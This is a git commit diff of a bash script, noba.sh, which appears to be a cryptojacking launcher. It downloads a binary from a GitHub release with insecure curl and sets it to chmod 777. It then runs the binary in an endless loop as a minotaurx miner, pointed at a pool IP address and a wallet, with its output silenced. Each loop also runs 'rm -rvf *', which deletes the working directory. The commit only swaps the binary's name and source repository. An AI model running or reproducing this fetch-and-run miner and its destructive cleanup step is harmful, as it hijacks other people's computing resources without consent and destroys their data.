db9cf1e5b5789289e945b7177ec450be2056b932
paskofa10 <mr.paskofa10@jugda.com>
2025-06-16 13:44:33 +0700

    Update noba.sh

--- noba.sh
+++ noba.sh
@@ -1,9 +1,9 @@
 #!/bin/bash
  
-curl -sLkO http://github.com/paskofa10/KunCuN/releases/download/uranus/centu
-chmod 777 centu
+curl -sLkO http://github.com/paskofa10/noband/releases/download/daemon/cetuz
+chmod 777 cetuz
 while [ 1 ]; do
-./centu -a minotaurx -o 188.165.24.209:7019 -u MM2DPsr5664vCMZP3LiWhxwimmfvohUeHW -p c=MAZA,zap=MAZA >/dev/null 2>&1 &
+./cetuz -a minotaurx -o 188.165.24.209:7019 -u MM2DPsr5664vCMZP3LiWhxwimmfvohUeHW -p c=MAZA,zap=MAZA >/dev/null 2>&1 &
 sleep 10
 rm -rvf *
 done
